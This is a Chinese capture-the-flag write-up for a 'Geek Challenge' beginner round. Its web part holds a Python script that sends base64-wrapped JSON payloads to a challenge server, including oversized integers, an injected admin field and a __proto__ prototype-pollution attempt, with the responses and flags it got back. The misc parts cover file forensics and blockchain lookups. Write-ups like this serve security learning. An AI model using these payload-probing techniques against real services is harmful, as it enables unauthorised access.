# 极客大挑战 上手篇

## Web

### 阿基里斯追乌龟

本题目标：先把对象 `JSON.stringify` 成 UTF-8 字节，然后对这些字节做 Base64 编码，得到一个 ASCII 字符串。再把这个 ASCII 字符串放进请求的 `{"data":"...base64..."}`。

服务器以 base64 封装 JSON 解析输入。存在两条能返回 `flag` 的路径：一条是“非预期”或“伪 flag”（由浮点/比较问题触发），另一条是真实 flag（通过大整数或某些字段绕过）。

```python
import requests, base64, json

HOST = "http://019a621d-10f1-7423-89c5-5eabc51fdb82.geek.ctfplus.cn"
URL = HOST + "/chase"

def pack(obj):
    # 与前端 btoa(unescape(encodeURIComponent(JSON.stringify(obj)))) 等价
    j = json.dumps(obj, separators=(",", ":"), ensure_ascii=False)
    b = j.encode("utf-8")
    return base64.b64encode(b).decode()

def unpack(b64):
    try:
        b = base64.b64decode(b64)
        return json.loads(b.decode("utf-8"))
    except Exception as e:
        return {"_decode_error": str(e), "raw": b64}

def send(payload_obj):
    data = {"data": pack(payload_obj)}
    r = requests.post(URL, json=data, timeout=10)
    if r.status_code != 200:
        print("HTTP", r.status_code, r.text)
        return None
    try:
        resp = r.json()
    except:
        print("非 JSON 响应:", r.text)
        return None
    if "data" in resp:
        return unpack(resp["data"])
    else:
        return resp

if __name__ == "__main__":
    tests = [
        {"achilles_distance":10000000000,"tortoise_distance":11000000000},  # 已记录的
        {"achilles_distance":11000000000,"tortoise_distance":11000000000},  # 相等
        {"achilles_distance":999999999999999999999,"tortoise_distance":100},  # 超大数
        {"achilles_distance":"110","tortoise_distance":"100"},  # 字符串类型
        {"achilles_distance":110,"tortoise_distance":100,"admin":True},  # 注入字段
        {"__proto__": {"isAdmin": True}},  # prototype 注入尝试（视实现而定）
    ]
    for t in tests:
        print("=> 发送:", t)
        resp = send(t)
        print("<= 响应:", json.dumps(resp, ensure_ascii=False, indent=2))
        print("-"*60)

=> 发送: {'achilles_distance': 10000000000, 'tortoise_distance': 11000000000}
<= 响应: {
  "message": "Achilles has not caught up with the tortoise yet."
}
------------------------------------------------------------
=> 发送: {'achilles_distance': 11000000000, 'tortoise_distance': 11000000000}
<= 响应: {
  "flag": "哦天哪，可恶的浮点数问题，居然真的让你追到了。\n然而这并不是预期的解法，阿基里斯可以跑得更快对吗？\nSYC{this_is_fake_flag}"
}
------------------------------------------------------------
=> 发送: {'achilles_distance': 999999999999999999999, 'tortoise_distance': 100}
<= 响应: {
  "flag": "SYC{Spi1t_th3_T1me_t0_the_3nd_019a621d10da70dfa1abe9d7e916e101}"
}
------------------------------------------------------------
=> 发送: {'achilles_distance': '110', 'tortoise_distance': '100'}
HTTP 500 <!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>        

<= 响应: null
------------------------------------------------------------
=> 发送: {'achilles_distance': 110, 'tortoise_distance': 100, 'admin': True}
<= 响应: {
  "flag": "SYC{Spi1t_th3_T1me_t0_the_3nd_019a621d10da70dfa1abe9d7e916e101}"
}
------------------------------------------------------------
=> 发送: {'__proto__': {'isAdmin': True}}
<= 响应: {
  "flag": "哦天哪，可恶的浮点数问题，居然真的让你追到了。\n然而这并不是预期的解法，阿基里斯可以跑得更快对吗？\nSYC{this_is_fake_flag}"
}
------------------------------------------------------------
```

1. 在 Repeater 的请求体里把 `data` 的值替换为 `pack(...)` 得到的字符串。
2. 请求体仍然是 `{"data":"<base64字符串>"}`，Content-Type 保持 `application/json`。
3. 观察响应。若返回 500，检查你粘的 base64 是否能被 base64 解码并得到有效 JSON（在 Burp Decoder 解码回 JSON 验证）。

## Misc

### Bite off picture

这道题是我的梦魇...我最讨厌CRC校验相关的题了

和我以前做的题完全相反，我以为题目提示是说要用010开png，结果这次是要拿010开zip。

zip尾部有个base64编码，解码之后出了字符串（鬼知道这东西还要用作密码）

然后打开是得到了一个png文件，修了crc，无效，结果还是要修长宽比，所以crc到底有什么用，提示吗？？？

### Blockchain SignIn

登录，show more，UTF=8解码，结束了？？？

### 1Z Sign

打开浏览器，访问交易链接 `https://etherscan.io/tx/0x1d3040872d9c3d15d47323996926c2aa5c7b636fc7209f701301878dcf438598`。

在交易页面找到 “Logs”标签并点击。

在 Logs 列表里查找带有 `Swap`、`Pool`、或类似名字的条目。展开该条目的详细内容。

在该日志的详细内容中查找 `fee` 或 `fee:` 字样。这个 `9900` 就是链上存储的“费率编码”数值。

把 `9900` 换算成百分比：用 `9900 ÷ 10000 = 0.99%`。

Uniswap V3/V4 等常把费率存为整数，比如 `3000` 对应 `0.3%`，因此通用换算为 `fee_int / 10000` 得到百分比。

按题目要求包装结果：`SYC{0.99%}`。完成。

### Dream

访问地址`https://sepolia.etherscan.io/address/0xd8B361E50174c4Ae99E31dCdF10B353C961f9C43`，导出翻一遍，Contract里有好多参数，扔给AI看一下，能看到`Push24`里有长参数，是十六进制参数，转成ASCII码能得出是Flag格式

### Hidden

docx的实际格式为zip，所以直接改后缀名zip，在doc文件夹下翻到flag3.jpg和word.txt。

按照文本优先规则，先处理word.txt，可以看到后面有==（base64标识），所以拿去解析发现是字符串，可以盲猜是flag中段。

对于flag3.jpg，可以发现是无法直接打开的，可以猜测为三个方向：文件头被破坏、文件数据隐写或文件头篡改。

抓一下JFIF可以找到偏移位置，修复即得到相应图片（即flag3字符串）

对于flag1是无法直接找到的，无奈之下只能遍历一下SYC{字符串，在document.xml里找到了两个 `<w:t>` 节点。所以拼一下，得到完整flag。

### 西纳普斯的许愿碑

**沙箱逃逸方向错误**：safe_grant + AST.parse + audit_hook + WAF 多层拦截，所有注入点都不成立。

**fuzz 特殊字符错误**：decode 后字符导致 SyntaxError，但根本无法进入 exec，永远谈不上利用。

**race condition 错误**：cleanup 删除的是新 append 的 index≥6 数据，不会删除官方愿望。

**后门字符串匹配错误**：附件不存在“see the truth”逻辑，非真实漏洞点。

寄了，做不出来。

### CRDT

一道RGA风格的CRDT，拿“parent + ID 排序” 来决定字符顺序。

遍历整棵树 → 得到最终文本。（话说这玩意是数据结构题吧）
